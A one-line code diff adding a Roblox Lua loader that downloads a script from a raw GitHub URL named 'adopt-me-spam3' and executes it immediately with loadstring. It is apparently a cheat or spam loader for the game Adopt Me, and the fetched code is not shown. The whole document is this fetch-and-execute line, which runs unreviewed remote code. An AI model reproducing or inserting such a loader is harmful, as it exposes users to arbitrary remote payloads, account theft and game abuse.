@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/adopt-me-spam3-ee90k0r6ntxdb2.lua"))()
